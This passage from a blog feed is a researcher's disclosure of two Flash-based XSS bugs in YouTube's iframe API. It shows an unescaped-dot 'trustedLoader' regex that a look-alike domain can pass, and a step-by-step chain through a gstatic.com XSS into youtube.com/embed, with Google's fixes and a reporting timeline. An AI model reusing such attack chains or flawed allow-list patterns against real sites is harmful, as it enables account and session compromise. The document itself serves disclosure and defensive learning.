+<pre><code >public static const trustedLoader:RegExp = new RegExp("^https?://((www\.|encrypted\.)?google(\.com|\.co)?\.[a-z]{2,3}/(search|webhp)\?|24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf|www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris|tpc\.googlesyndication\.com/safeframe/|lightbox-(demos|builder)\.appspot\.com/|([A-Za-z0-9-]{1,63}\.)*(imasdk\.googleapis\.com|corp\.google\.com|borg\.google\.com|docs\.google\.com|drive\.google\.com|googleads\.g\.doubleclick\.net|googleplex\.com|play\.google\.com|prod\.google\.com|sandbox\.google\.com|photos\.google\.com|picasaweb\.google\.com|lh2\.google\.com|plus\.google\.com|books\.googleusercontent\.com|mail\.google\.com|talkgadget\.google\.com|survey\.g\.doubleclick\.net|youtube\.com|youtube\.googleapis\.com|youtube-nocookie\.com|youtubeeducation\.com|vevo\.com)(:[0-9]+)?([\/\?\#]|$))");</code></pre></p>
+<blockquote><p>Before reading more, you should check the regex yourself and try to find the mistake in it!</p>
+<p>&nbsp;</p></blockquote>
+<p>&#8220;.&#8221; (dot) is a wildcard in Regex, which means it will match any character. If you only want to match a literal dot, you have to escape it like this &#8220;\.&#8221;<br />
+In trustedLoader RegExp, we have this code : <pre><code >24e12c4a-a-95274a9c-s-sites.googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf</code></pre><br />
+where the dots are not escaped. This means that we can replace the dots by any character and it will still match the Regex.<br />
+in particular, http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf will match the regex, and this domain is not owned by Google. It was available so I bought it for 1$! (You could use any alphanumeric character instead of A)<br />
+I hosted a html page at http://24e12c4a-a-95274a9c-s-sites<strong>A</strong>googlegroups.com/a/google.com/flash-api-test-harness/apiharness.swf that will load a Youtube iframe and I have access to the private commands of the Youtube api.</p>
+<p>Among the private commands there is a function updateVideoData(), that allows you to inject an arbitrary Flash file as a poster image exactly like with loadPlaylist() before. I won&#8217;t go into details as the rest of the report is similar to previous one.</p>
+<p>Mitigation:<br />
+Google patched trustedLoader Regex to properly escape dots like this 24e12c4a-a-95274a9c-s-sites\.googlegroups\.com/a/google\.com/flash-api-test-harness/apiharness\.swf</p>
+<p>Timeline:<br />
+11/22/2016 Report to Google<br />
+11/29/2016 Reward<img loading="lazy" class="alignnone wp-image-141" src="/wp-content/uploads/2017/08/2-stars.png" alt="" width="56" height="13" /><br />
+01/18/2017 Issue fixed and verified</p>
+<p>&nbsp;</p>
+<h3>3. Flash based XSS using trustedLoader regex&#8230; again!</h3>
+<p>Let&#8217;s have a look at the trustedLoader regex again. There are still problems with it! For example <pre><code >google(\.com|\.co)?\.[a-z]{2,3}</code></pre> is not a secure way to check that a domain is a Google owned domain because <pre><code >google.com.fun</code></pre> for example will match the regex but is not a Google owned domain.<br />
+Let&#8217;s take another example: <pre><code >www\.gstatic\.com/doubleclick/studio/innovation/h5/layouts/tetris</code></pre> is consider a trusted url. But there are XSSes in other www.gstatic.com webpages, and from there we can execute arbitrary javascript on www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris and then load a Youtube iframe, send a updateVideoData() command and execute XSS on youtube.com/embed.</p>
+<p>Let&#8217;s make a drawing of the attack workflow:</p>
+<p><a href="/wp-content/uploads/2017/09/Diagramme10.svg"><img loading="lazy" class="wp-image-191 aligncenter" src="/wp-content/uploads/2017/09/Diagramme10.svg" alt="" width="923" height="406" /></a></p>
+<p>Technical details:<br />
+Prerequisite: The victim has Flash Player and opens www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf?chartId=[arbitrary javascript]<br />
+1. The arbitrary javascript makes www.gstatic.com/charts/motionchart/0/en_GB/tlz-gviz.swf load an iframe at https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris<br />
+2-3-4. The arbitrary javascript makes https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris load an iframe at youtube.com/embed<br />
+5. The arbitrary javascript sends a updateVideoData() command to Youtube iframe<br />
+6. Youtube iframe accepts the command because https://www.gstatic.com/doubleclick/studio/innovation/h5/layouts/tetris is a trusted loader, and transmits it to Main App<br />
+7. Main App loads arbitrary Flash file (the open redirection was different this time because previous one was fixed)<br />
+8. Evil Flash file executes XSS on youtube.com/embed</p>
+<p>&nbsp;</p>
+<p>Mitigation:<br />
+Youtube removed the option nohtml5=1 to force the Flash fallback. There are still similar vulnerabilities but they are now limited to browsers that can&#8217;t play video using html5. This is typically very old browsers that are out of scope for Bug Bounty programs.</p>
+<p>Timeline:<br />
+02/02/2017 Report to Google<br />
+02/02/2017 &#8220;Nice catch&#8221; from Eduardo, who also advised me to apply to <a href="https://www.google.com/about/appsecurity/research-grants/" target="_blank" rel="noopener noreferrer">Google Research Grants </a>program<br />
+02/14/2017 Reward <img loading="lazy" class="alignnone size-full wp-image-70" src="/wp-content/uploads/2017/08/3-stars.png" alt="" width="60" height="14" /><br />
+04/11/2017 Issue fixed and verified</p>
+<p>Conclusion:<br />
+You can see that Flash and javascript are very similar and can be used together or you can replace one by the other. The same is true for Flash security and javascript security, this is why I think it is useful to learn about Flash implementation vulnerabilities in order to build more secure javascript applications (especially when there is a Flash fallback). You can also see that Flash based XSS are very similar to DOM XSSes is the sense that they only reveal during code execution and cannot be caught by Web Application Firewalls, browser based mitigation like XSS auditor or even vulnerability scanners.</p>
+<p>Thank you very much for reading, and I also want to thank Google VRP team because you are really doing an amazing work!</p>
+<p>In the future I will disclose more mixed javascript/Flash bugs from Youtube, Facebook, WordPress and others, and slowly we will get rid of Flash and I will disclose pure javascript vulnerabilities on those domains.</p>
+
+<div class="twitter-share"><a href="https://twitter.com/intent/tweet?text=Flash%20based%20%23XSS-es%20on%20Youtube%20iframe%20api%20%28Flash%20vulnerabilities%20in%20Youtube%20Part%204%29&#038;url=https%3A%2F%2Fopnsec.com%2F2017%2F09%2Fadvanced-flash-vulnerabilities-in-youtube-part-4%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
+]]></content:encoded>
+					
+					<wfw:commentRss>/2017/09/advanced-flash-vulnerabilities-in-youtube-part-4/feed/</wfw:commentRss>
+			<slash:comments>4</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">188</post-id>	</item>
+	</channel>
+</rss>
